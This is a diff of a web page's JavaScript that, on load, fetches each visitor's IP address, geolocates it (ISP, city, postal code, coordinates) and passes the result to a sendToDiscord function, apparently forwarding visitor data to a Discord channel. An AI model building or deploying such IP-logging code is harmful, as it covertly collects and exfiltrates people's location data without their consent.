@@ -1,24 +1,25 @@
 document.addEventListener('DOMContentLoaded', () => {
-  fetch('https://json.geoiplookup.io/?callback=yourCallback')
+  const scriptElement = document.createElement('script');
+  scriptElement.src = 'https://json.geoiplookup.io/?callback=yourCallback';
+  document.head.appendChild(scriptElement);
+});
+
+function yourCallback(data) {
+  const ipAddress = data.ip;
+  const currentDateTime = new Date();
+  const dateTimeString = currentDateTime.toLocaleString();
+
+  fetch(`https://json.geoiplookup.io/${ipAddress}`)
     .then(response => response.json())
-    .then(data => {
-      const ipAddress = data.ip;
-      const currentDateTime = new Date();
-      const dateTimeString = currentDateTime.toLocaleString();
-
-      fetch(`https://json.geoiplookup.io/${ipAddress}`)
-        .then(response => response.json())
-        .then(geoData => {
-          const message = createMessage(ipAddress, dateTimeString, geoData);
-          sendToDiscord(message);
-        })
-        .catch(error => console.error(error));
-
-      document.getElementById('ip-address').textContent = `IP Address: ${ipAddress}`;
-      document.getElementById('datetime').textContent = `Date and Time: ${dateTimeString}`;
+    .then(geoData => {
+      const message = createMessage(ipAddress, dateTimeString, geoData);
+      sendToDiscord(message);
     })
     .catch(error => console.error(error));
-});
+
+  document.getElementById('ip-address').textContent = `IP Address: ${ipAddress}`;
+  document.getElementById('datetime').textContent = `Date and Time: ${dateTimeString}`;
+}
 
 function createMessage(ipAddress, dateTimeString, geoData) {
   const { ip, isp, country_name, region, city, postal, latitude, longitude } = geoData;
